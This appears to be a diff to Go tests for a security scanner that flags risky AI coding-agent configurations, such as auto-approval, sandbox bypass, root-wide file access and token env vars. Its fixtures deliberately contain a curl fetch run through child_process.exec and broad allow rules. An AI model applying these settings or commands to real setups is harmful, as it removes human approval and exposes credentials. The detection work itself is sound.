@@ -56,7 +56,9 @@ func TestClaudeProfileDetectsHooksScriptsInstructionsAndPackageRisk(t *testing.T
 	workspace := t.TempDir()
 	mustWrite(t, filepath.Join(workspace, ".claude", "settings.json"), `{
 		"hooks": {"PreToolUse": [{"command": "bash -c 'echo ok'"}]},
-		"mcpServers": {"demo": {"command": "node"}}
+		"mcpServers": {"demo": {"command": "node"}},
+		"permissions": {"allow": ["Bash(*)", "Read(/)"]},
+		"env": {"GITHUB_TOKEN": "${GITHUB_TOKEN}"}
 	}`)
 	mustWrite(t, filepath.Join(workspace, ".claude", "router_init.js"), `require("child_process").exec("curl -fsSL https://example.invalid/x")`)
 	mustWrite(t, filepath.Join(workspace, "CLAUDE.md"), "Run chmod +x ./setup.sh before starting.")
@@ -69,6 +71,8 @@ func TestClaudeProfileDetectsHooksScriptsInstructionsAndPackageRisk(t *testing.T
 
 	assertWarning(t, result, "claude-hooks-enabled")
 	assertWarning(t, result, "claude-mcp-config")
+	assertWarning(t, result, "claude-auto-approval")
+	assertWarning(t, result, "claude-risky-env-var")
 	assertWarning(t, result, "claude-shell-bootstrap")
 	assertWarning(t, result, "claude-script-executable-script")
 	assertWarning(t, result, "claude-instructions")
@@ -84,7 +88,10 @@ func TestCodexProfileDetectsSandboxApprovalWritableRootsAndEnvFlags(t *testing.T
 	mustWrite(t, filepath.Join(home, ".codex", "config.toml"), `
 sandbox_mode = "danger-full-access"
 approval_policy = "never"
-writable_roots = ["/"]
+writable_roots = ["/", "/tmp"]
+dangerously_bypass_approvals_and_sandbox = true
+[env]
+AWS_SECRET_ACCESS_KEY = "from-shell"
 `)
 	opts := testOptions(t)
 	opts.HomeDir = home
@@ -96,8 +103,48 @@ writable_roots = ["/"]
 	assertWarning(t, result, "codex-danger-full-access")
 	assertWarning(t, result, "codex-no-approval")
 	assertWarning(t, result, "codex-broad-path-scope")
+	assertWarning(t, result, "codex-auto-approval")
+	assertWarning(t, result, "codex-risky-env-var")
 	assertWarning(t, result, "codex-unsafe-env-flags")
 	assertWarning(t, result, "codex-broad-env-path")
+}
+
+func TestCopilotProfileDetectsMCPAutoApprovalBroadScopeAndRiskyEnv(t *testing.T) {
+	t.Parallel()
+
+	workspace := t.TempDir()
+	mustWrite(t, filepath.Join(workspace, ".copilot", "settings.json"), `{
+		"allowAllTools": true,
+		"mcpServers": {"filesystem": {"command": "npx", "args": ["-y", "@modelcontextprotocol/server-filesystem", "/"]}},
+		"addDirs": ["/"],
+		"env": {"GH_TOKEN": "${GH_TOKEN}"}
+	}`)
+
+	result := clientprofiles.New("copilot", testOptions(t)).Check(context.Background(), workspace)
+
+	assertWarning(t, result, "copilot-allow-all-tools")
+	assertWarning(t, result, "copilot-mcp-config")
+	assertWarning(t, result, "copilot-broad-path-scope")
+	assertWarning(t, result, "copilot-risky-env-var")
+}
+
+func TestGeminiProfileDetectsMCPAutoApprovalBroadScopeAndRiskyEnv(t *testing.T) {
+	t.Parallel()
+
+	workspace := t.TempDir()
+	mustWrite(t, filepath.Join(workspace, ".gemini", "settings.json"), `{
+		"tools": {"autoApprove": true},
+		"mcpServers": {"shell": {"command": "bash", "args": ["-lc", "echo ok"]}},
+		"sandbox": {"writableRoots": ["/"]},
+		"env": {"GITHUB_TOKEN": "${GITHUB_TOKEN}"}
+	}`)
+
+	result := clientprofiles.New("gemini", testOptions(t)).Check(context.Background(), workspace)
+
+	assertWarning(t, result, "gemini-auto-approval")
+	assertWarning(t, result, "gemini-mcp-config")
+	assertWarning(t, result, "gemini-broad-path-scope")
+	assertWarning(t, result, "gemini-risky-env-var")
 }
 
 func TestLocalProfileDetectsNonLoopbackEndpointAndPublicBindWithoutAuth(t *testing.T) {
@@ -123,11 +170,21 @@ func TestMiniMaxProfileDetectsKeyInConfig(t *testing.T) {
 	t.Parallel()
 
 	workspace := t.TempDir()
-	mustWrite(t, filepath.Join(workspace, ".minimax", "config.json"), `{"minimax_api_key":"sk-test-value"}`)
+	mustWrite(t, filepath.Join(workspace, ".minimax", "config.json"), `{
+		"minimax_api_key": "sk-test-value",
+		"tools": {"autoApprove": true},
+		"mcp_servers": {"browser": {"command": "node", "args": ["server.js"]}},
+		"workspaceRoots": ["/"],
+		"env": {"AWS_ACCESS_KEY_ID": "${AWS_ACCESS_KEY_ID}"}
+	}`)
 
 	result := clientprofiles.New("minimax", testOptions(t)).Check(context.Background(), workspace)
 
 	assertWarning(t, result, "minimax-key-in-config")
+	assertWarning(t, result, "minimax-auto-approval")
+	assertWarning(t, result, "minimax-mcp-config")
+	assertWarning(t, result, "minimax-broad-path-scope")
+	assertWarning(t, result, "minimax-risky-env-var")
 }
 
 func TestProfilesHonorCanceledContext(t *testing.T) {
